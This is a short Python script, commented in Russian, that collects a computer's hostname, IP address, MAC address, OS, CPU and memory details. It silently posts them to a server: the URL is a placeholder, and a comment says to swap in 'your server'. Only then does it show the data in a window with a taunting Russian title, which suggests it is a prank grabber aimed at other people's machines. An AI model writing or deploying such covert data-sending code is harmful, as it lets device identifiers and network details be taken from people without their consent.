import os
import platform
import socket
import uuid
import psutil
import tkinter as tk
import requests
from tkinter import messagebox

def get_system_info():
    memory = psutil.virtual_memory()
    system_info = {
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": "macOS" if platform.system() == "Darwin" else platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture()[0],
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                                 for i in range(0, 8*6, 8)][::-1]),
        "CPU": platform.processor(),
        "Total Memory (GB)": round(memory.total / (1024 ** 3), 2),
        "Available Memory (GB)": round(memory.available / (1024 ** 3), 2)
    }
    return system_info

def send_data_to_server(data):
    try:
        # Замените URL на адрес вашего сервера
        server_url = "https://httpbin.org/post"
        response = requests.post(server_url, json=data)
        if response.status_code == 200:
            print("Data sent successfully!")
        else:
            print(f"Failed to send data: {response.status_code}")
    except Exception as e:
        print(f"Error while sending data: {e}")

def show_info_in_window():
    # Получаем информацию о системе
    info = get_system_info()
    
    # Отправляем данные на сервер
    send_data_to_server(info)

    # Создаем окно с использованием Tkinter
    window = tk.Tk()
    window.title("Терь ты плаки плаки (macOS)")
    window.geometry("600x500")

    # Добавляем заголовок
    label_title = tk.Label(window, text="Информация о системе", font=("Arial", 16, "bold"))
    label_title.pack(pady=10)

    # Выводим информацию построчно
    for key, value in info.items():
        label = tk.Label(window, text=f"{key}: {value}", font=("Arial", 14))
        label.pack(anchor="w", padx=10)

    # Запускаем интерфейс
    window.mainloop()

if __name__ == "__main__":
    show_info_in_window()
